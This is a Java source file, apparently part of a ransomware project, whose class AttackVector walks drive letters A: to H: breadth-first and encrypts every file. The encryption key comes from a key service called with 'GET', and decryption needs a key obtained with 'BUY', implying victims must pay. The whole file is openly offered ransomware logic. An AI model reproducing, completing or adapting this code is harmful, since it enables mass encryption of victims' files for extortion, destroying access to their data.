package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.Collections;
import java.util.Map;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.cryptFile.CryptoOperation;
import Agent.cryptFile.DecryptFile;
import Agent.cryptFile.EncryptFile;
import Agent.entites.AlgorithmsMap;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.services.KeyService;
import Agent.traversal.*;

public class AttackVector implements RansomVector {

	private KeyService keyService;

	@Override
	public void encryptFileSystem() throws RansomwareException {
		try {
			cryptFileSystem(keyService.getKey("GET"), new EncryptFile());
		} catch (RansomwareException e) {
			throw new RansomwareException("Encrypting the file-system failed", e.getCause());
		}

	}

	@Override
	public void decryptFileSystem() throws RansomwareException {
		try {

			cryptFileSystem(keyService.getKey("BUY"), new DecryptFile());
		} catch (RansomwareException e) {
			throw new RansomwareException("Decrypting the file-system failed", e.getCause());
		}

	}

	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws RansomwareException {
		// Traverse<File> dfs = new DFS<File>();
		// or
		Traverse<File> bfs = new BFS<File>();
		Collection<File> visitedFolders = Collections.emptySet();

		for (char i = 'A'; i <= 'H'; i++) {
			try {
				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
			} catch (RansomwareException e) {
				throw new RansomwareException("Traverse the whole file-system failed", e.getCause());
			}

		}
	}

	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
		return algorithmMap.get(className);
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
			CryptoOperation cryptoFunc) throws RansomwareException {

		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());

		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = (File) struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}

					} else if (file.isFile()) {
						try {
							cryptoFunc.operate(key, file, crypto);
						} catch (RansomwareException e) {
							throw new RansomwareException("crypt opertation failed", e.getCause());
						}

					}
				}
			}

		}
	}
}
